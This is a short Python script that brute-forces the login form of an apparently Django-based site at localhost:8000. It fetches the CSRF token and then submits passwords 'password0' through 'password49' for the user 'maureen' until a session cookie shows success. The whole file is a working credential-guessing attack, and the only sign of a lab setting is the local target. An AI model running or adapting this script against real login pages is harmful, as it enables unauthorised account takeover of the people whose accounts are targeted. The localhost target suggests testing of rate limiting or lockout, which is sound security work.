import requests

session = requests.Session()

url = "http://localhost:8000/login/"

login_page = session.get(url)

csrf = session.cookies["csrftoken"]

for i in range(50):
  response = session.post(
    url, 
    data={"username": "maureen", "password":"password"+str(i), "csrfmiddlewaretoken": csrf})
  print(response.request.body)
  if "sessionid" in session.cookies:
    print("✅ Hallelujah, correct password found:", "password" + str(i))
    break